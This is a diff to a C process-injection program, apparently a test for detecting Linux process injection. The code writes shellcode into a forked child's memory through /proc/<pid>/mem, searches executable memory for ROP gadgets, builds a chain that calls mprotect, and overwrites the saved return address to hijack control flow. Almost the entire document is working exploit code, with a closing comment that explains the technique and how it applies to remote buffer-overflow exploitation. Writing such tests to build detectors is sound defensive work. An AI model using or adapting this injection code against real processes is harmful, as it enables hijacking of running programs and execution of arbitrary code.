@@ -8,12 +8,6 @@
 #include <elf.h>
 #include <sys/mman.h>
 
-typedef struct {
-    const uint8_t  *bytes;
-    size_t          len;
-    uint64_t        addr;
-} Gadget;
-
 unsigned char shellcode[] = {
     0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
     0xeb, 0x26,                    // jmp short get_path
@@ -35,20 +29,26 @@ unsigned char shellcode[] = {
     0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
     0x00                          
 };
-unsigned int shellcode_len = 60;
+unsigned int shellcode_len = sizeof(shellcode);
 
 #define MAX_LOOPS 100
+#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
+
+typedef struct {
+    const uint8_t  *bytes;
+    size_t          len;
+    uint64_t        addr;
+} Gadget;
 
 pid_t create_victim_child_process() {
     pid_t pid = fork();
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
         exit(0);
     }
-    sleep(0.2);
+    usleep(200000);
     return pid;
 }
 
@@ -113,7 +113,7 @@ long get_reg(pid_t pid, const char* reg) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
 
-    //try to read registers until theu became available
+    //try to read registers until they become available
     ssize_t bytesRead;
     int i=0;
     while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
@@ -124,6 +124,7 @@ long get_reg(pid_t pid, const char* reg) {
     }
 
     close(fd);
+    if (bytesRead <= 0) return -1;
     buffer[bytesRead] = '\0';
 
     long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
@@ -161,7 +162,7 @@ long find_memory_region(long pid, size_t required_len, const char *target_perms)
         char perms[5];
         if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
             
-            // has this region all the persmissio required?
+            // has this region all the permissions required?
             int has_all_perms = 1;
             for (int i = 0; target_perms[i] != '\0'; i++) {
                 if (strchr(perms, target_perms[i]) == NULL) {
@@ -171,7 +172,7 @@ long find_memory_region(long pid, size_t required_len, const char *target_perms)
             }
             
             if (has_all_perms) {
-                // is this region, with the correct permission, big enought?
+                // is this region, with the correct permission, big enough?
                 size_t region_size = (size_t)(end - start);
                 if (region_size >= required_len) {
                     found_address = start;
@@ -208,7 +209,7 @@ long find_return_address(long pid, long rsp) {
     FILE *maps_file = fopen(maps_file_name, "r");
     if (maps_file == NULL) return -1;
 
-    int best_index = 9999; // Teniamo traccia dell'indice più vicino a RSP
+    int best_index = 9999; // Track the index closest to RSP
     long found_ret_addr_location = -1;
 
     //for every region in the memory ...
@@ -257,6 +258,20 @@ long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
         return -1;
     }
 
+    size_t max_gadget_len = 0;
+    for (int i = 0; i < num_gadgets; i++) {
+        if (gadgets[i].len > max_gadget_len) {
+            max_gadget_len = gadgets[i].len;
+        }
+    }
+    size_t overlap = max_gadget_len - 1;
+    unsigned char *buffer = malloc(CHUNK_SIZE);
+    if (!buffer) {
+        fclose(maps_file);
+        close(mem_fd);
+        return -1;
+    }
+
     char line[512];
     long found = 0;
 
@@ -270,29 +285,44 @@ long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
             continue;
         
         //has the region execute permission?
-        if (perms[2] != 'x')
+        if (strchr(perms, 'x') == NULL)
             continue;
 
-        size_t size = end - start;
-        unsigned char *buffer = malloc(size);
-        if (!buffer) continue;
-        if (pread(mem_fd, buffer, size, start) != (ssize_t)size) {
-            free(buffer);
-            continue;
-        }
-
-        for (int i = 0; i < num_gadgets; i++) {
-            if (gadgets[i].addr != 0) continue;
-            unsigned char *match = memmem(buffer, size, gadgets[i].bytes, gadgets[i].len);
-            if (match) {
-                gadgets[i].addr = start + (match - buffer);
-                found++;
+        long current_addr = start;
+        while (current_addr < end) {
+            size_t bytes_to_read = end - current_addr;
+            if (bytes_to_read > CHUNK_SIZE) {
+                bytes_to_read = CHUNK_SIZE;
             }
+
+            ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
+            if (bytes_read <= 0) break;
+
+            for (int i = 0; i < num_gadgets; i++) {
+                if (gadgets[i].addr != 0) continue;
+                
+                unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
+                if (match) {
+                    gadgets[i].addr = current_addr + (match - buffer);
+                    found++;
+                }
+            }
+
+            if (found == num_gadgets) {
+                free(buffer);
+                fclose(maps_file);
+                close(mem_fd);
+                return found;
+            }
+
+            if (current_addr + bytes_read < end) {
+                current_addr += (bytes_read - overlap);
+            } else
+                break; 
         }
-        free(buffer);
-        if (found == num_gadgets) break;
     }
 
+    free(buffer);
     fclose(maps_file);
     close(mem_fd);
     return found;
@@ -320,11 +350,18 @@ uint64_t* build_rop_chain(long address, pid_t pid){
     uint64_t pop_rax_ret = gadgets[3].addr;
     uint64_t syscall_ret = gadgets[4].addr;
 
-    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
+    printf("[+] All gadgets found:\n");
+    printf("    pop rdi; ret -> 0x%lx\n", pop_rdi_ret);
+    printf("    pop rsi; ret -> 0x%lx\n", pop_rsi_ret);
+    printf("    pop rdx; ret -> 0x%lx\n", pop_rdx_ret);
+    printf("    pop rax; ret -> 0x%lx\n", pop_rax_ret);
+    printf("    syscall; ret -> 0x%lx\n", syscall_ret);
 
-    long page_size = sysconf(_SC_PAGESIZE);     // very ofter it is gonna be 4096
-    long offset = address % page_size;          // distance from the start of the page
-    long aligned_addr = address - offset;       // address of the page page
+    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
+    if (!rop_chain) return NULL;
+
+    long offset = address % CHUNK_SIZE;          // distance from the start of the page
+    long aligned_addr = address - offset;       // address of the page
     long aligned_len = shellcode_len + offset;  // where the payload is gonna end in memory
 
     rop_chain[0] = pop_rdi_ret;
@@ -335,7 +372,7 @@ uint64_t* build_rop_chain(long address, pid_t pid){
     rop_chain[5] = PROT_READ | PROT_EXEC;               // RDX (r-x: 5)
     rop_chain[6] = pop_rax_ret;
     rop_chain[7] = 10;                                  // RAX (mprotect)
-    rop_chain[8] = syscall_ret;                         // Esegue mprotect
+    rop_chain[8] = syscall_ret;                         // executes mprotect
     rop_chain[9] = address;
 
     return rop_chain;
@@ -356,24 +393,26 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Writable memory region not found\n");
         exit(1);
     }
-    printf("[+] Writable memory region found here: 0x%lx\n", target_address);
+    printf("[+] Writable memory region found at: 0x%lx\n", target_address);
 
     unsigned char MemRegion[shellcode_len];
-    read_mem(MemRegion, pid, target_address, shellcode_len);
-    printf("[+] Memory region content before the injection: \n");
+    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] memory region content before the overwrite: \n");
     print_mem(MemRegion, shellcode_len);
 
     if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
-        fprintf(stderr, "[-] Failed to write payload into Memory region\n");
+        fprintf(stderr, "[-] Failed to write payload into memory region\n");
         exit(1);
     }
     printf("[+] Payload written successfully\n");
 
-    read_mem(MemRegion, pid, target_address, shellcode_len);
-    printf("[+] Memory region content after the injection: \n");
+    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] memory region content after the overwrite: \n");
     print_mem(MemRegion, shellcode_len);
 
-    //Construct a ROP chain to call mprotect and mark the memory region of our shellcode executable
+    // Construct a ROP chain to call mprotect and mark the memory region of our shellcode executable
     uint64_t *rop_chain = build_rop_chain(target_address, pid);
     if (rop_chain == NULL) {
         fprintf(stderr, "[-] ROP chain construction failed\n");
@@ -396,16 +435,27 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Return address not found\n");
         exit(1);
     }
-    printf("[+] Return_address: 0x%lx\n",return_address);
+    printf("[+] Return address: 0x%lx\n",return_address);
 
-    //Overwrite the return address in the stack with the ROP chain
+    // Overwrite the return address in the stack with the ROP chain
     ssize_t ret = write_in_mem(return_address, pid, (unsigned char *)rop_chain, rop_chain_size);
     free(rop_chain);
     if(ret != (ssize_t)rop_chain_size) {
-        fprintf(stderr, "[-] Failed to overwrite the Return address\n");
+        fprintf(stderr, "[-] Failed to overwrite the return address\n");
         exit(1);
     }
-    printf("[+] Return address overwritten successfully\n");
+    printf("[+] Return address overwritten successfully with the ROP chain\n");
+
+    unsigned char *buffer = malloc(rop_chain_size);
+    if (!buffer) {
+        fprintf(stderr, "[!] Warning: malloc failed, skipping post-overwrite dump\n");
+    } else {
+        if (read_mem(buffer, pid, return_address, rop_chain_size) != 0)
+            fprintf(stderr, "[!] Warning: failed to read memory of the ROP chain\n");
+        printf("[+] Return address location after the overwrite:\n");
+        print_mem(buffer, rop_chain_size);
+        free(buffer);
+    }
 
     printf("[+] Injection finished\n");
     exit(0); 
@@ -413,23 +463,27 @@ int main(int argc, char *argv[]) {
 
 /**
  * This technique performs control-flow hijacking via Return Address Overwriting.
- * It first identifies a (rw-) memory region by scanning /proc/[pid]/maps
- * and writes the shellcode into it through /proc/[pid]/mem.
- * It then build the ROP chain to call mprotect to make the payload executable
- * After that inspects the process stack (from the RSP register) to locate the saved return address.
+ * It first identifies a (rw-) memory region by scanning /proc/<pid>/maps
+ * and writes the shellcode into it through /proc/<pid>/mem.
+ * It then builds the ROP chain to call mprotect to make the payload executable
+ * After that it inspects the process stack (from the RSP register) to locate the saved return address.
  * By overwriting this stack location with the address of the code cave,
- * the execution, the moment the CPU executes the next RET instruction,
- * will be redirected to the ROP chain and then at the payload
+ * the moment the CPU executes the next RET instruction,
+ * execution is redirected into the ROP chain, and from there to the payload.
  * 
- * Why use this more complex approach, which also relies on the mprotect syscall?
- * - You might only have access through a buffer overflow on a remote server,
- *   instead in other cases you would need an RCE.
+ * Compared to the simpler "code cave + return address overwrite" variant,
+ * this technique does not require finding an executable code cave:
+ * it can write the payload into any writable region (heap, .data)
+ * and use a ROP chain to invoke mprotect and grant execution permissions before jumping into it.
+ * This is useful when no suitable executable cave is available in the victim's mapping,
+ * or in scenarios such as remote exploitation via buffer overflow,
+ * where the attacker has control over the stack but not over arbitrary memory writes.
  * 
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
  * where a process can only modify the memory of its own descendants.
- * This may differs from a real-world scenario where the attacker targets an arbitrary process,
- * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/[pid]/mem
+ * This may differ from a real-world scenario where the attacker targets an arbitrary process,
+ * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
  * access patterns are generated regardless of the relationship between injector and target.
  * 
  * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
